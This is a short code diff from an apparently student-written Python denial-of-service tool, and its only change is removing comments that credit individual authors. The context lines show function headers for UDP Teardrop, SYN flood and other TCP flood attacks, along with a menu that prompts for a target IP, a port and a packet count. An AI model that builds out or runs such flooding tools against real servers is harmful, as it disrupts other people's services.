@@ -15,7 +15,6 @@ start_time = 0
 # Locks for thread-safe access to shared variables
 sent_packets_lock = threading.Lock()
 
-#Jason's part
 # Function to log attack results
 def log_results(attack_type, packets_sent, duration):
     """
@@ -108,7 +107,6 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
         # Wait for 1 second before sending the next packet
         time.sleep(1)  # Update every second
 
-#hussein's part
 # Function for SYN flood attack
 def syn_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
     """
@@ -228,7 +226,6 @@ def main():
     server_ip = input("Server IP: ")
     server_port = int(input("Server port: "))
     Protocol = int(input("Choose an attack: \n1. UDP\n2. TCP\nEnter the protocol number: "))
-#Jason's part
     if Protocol == 1:  # UDP Attacks
         attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
         number_of_packets = int(input("Enter the number of times to execute the attack: "))
@@ -264,7 +261,6 @@ def main():
             # Wait for all threads to finish
             for thread in threads:
                 thread.join()
-#hussein's part 
     elif Protocol == 2:  # TCP Attacks
         attack_number = int(input("Choose an attack: \n1. Syn Flood Attack\n2. Syn-Ack Flood Attack\n3. Ack Flood Attack\n4. Fin Flood Attack\nEnter the attack number: "))
         number_of_packets = int(input("Enter the number of times to execute the attack: "))
